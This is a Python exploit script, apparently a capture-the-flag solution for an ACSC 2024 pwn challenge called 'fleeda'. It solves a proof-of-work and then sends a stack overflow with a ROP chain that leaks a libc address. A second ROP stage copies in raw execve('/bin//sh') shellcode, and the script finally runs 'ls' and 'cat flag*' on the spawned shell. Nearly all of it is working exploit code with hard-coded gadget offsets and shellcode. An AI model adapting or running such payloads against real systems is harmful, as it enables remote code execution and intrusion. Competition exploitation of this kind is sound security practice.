from ptrlib import *
from time import *
from Crypto.Util.number import bytes_to_long
import hashlib

def is_valid(digest):
    if sys.version_info.major == 2:
        digest = [ord(i) for i in digest]
    bits = ''.join(bin(i)[2:].zfill(8) for i in digest)
    return bits[:difficulty] == zeros

stdout_addr = 0x404030
input_addr = 0x401076
output_addr = 0x401083

HOST = "localhost"
#HOST = "fleeda.chal.2024.ctf.acsc.asia"
PORT = 8109

sock = Socket(HOST, PORT)

def solvePow(conn):
    chal = conn.recvline()
    print(chal)
    prefix = chal.split(b'(')[1].split(b'+')[0]
    difficulty = int(chal.split(b'(')[2].split(b')')[0])
    print(prefix)
    print(difficulty)

    i = 0
    while True:
        if i%1000000 == 0:
          print(i)
        i += 1
        s = prefix + str(i).encode()
        if (bytes_to_long(hashlib.sha256(s).digest())>>(256 - difficulty)) == 0:
            conn.sendlineafter(b'> ', str(i).encode())
            assert b'passed' in conn.recvline()
            break

solvePow(sock)
print('done')

#sock = Process(["frida", "-q", "-l", "./inst.js", "-f", "./prog"], cwd="../")
#sock = Process("../prog")
sleep(2)
#input('wait')



payload = b''
payload += b'A' * 0x10
payload += p64(stdout_addr)
payload += p64(output_addr)
payload += b'A' * 0x10
payload += p64(0x404800)
payload += p64(0x401060)
assert not b'\n' in payload
sock.sendline(payload)

#input('att')

res = sock.recvuntil(b'\x7f\n')
print(res)

libc_addr = u64(res[-7:-1].ljust(8, b'\x00')) - 0x21b780
print('libc_addr: ' + hex(libc_addr))

payload = b''
payload += b'A' * 0x10
payload += p64(0x404800)
payload += p64(input_addr)
payload += b'A' * 0x10
payload += p64(0x404e00)
payload += p64(libc_addr + 0x2a3e5) # pop rdi
payload += p64(libc_addr + 0x28100)
payload += p64(libc_addr + 0x2be51) # pop rsi
payload += p64(0x404800)
payload += p64(libc_addr + 0x174e06) # pop rdx ; pop rbx ; ret
payload += p64(100)
payload += p64(0x404e00)
payload += p64(libc_addr + 0xc4870) # memcpy
payload += p64(libc_addr + 0x28100)

payload += p64(0xfeedface)
payload += p64(0xfeedface)
assert not b'\n' in payload
sock.sendline(payload)

#input('go')

payload = b''
payload +=  b'\x48\x31\xed\x55\x48\xbf\x2f\x2f\x62\x69\x6e\x2f\x73\x68\x57\x54\x5f\x55\x57\x54\x5e\x55\x5a\x6a\x3b\x58\x0f\x05\x6A\x60\x58\x0f\x05'
assert len(payload) <= 100
assert not b'\n' in payload
sock.sendline(payload)

sleep(2)

sock.sendline(b'ls\n')
sock.sendline(b'cat flag*\n')

while 1:
  res = sock.recv(1024)
  print(res)
  if not res:
    input()
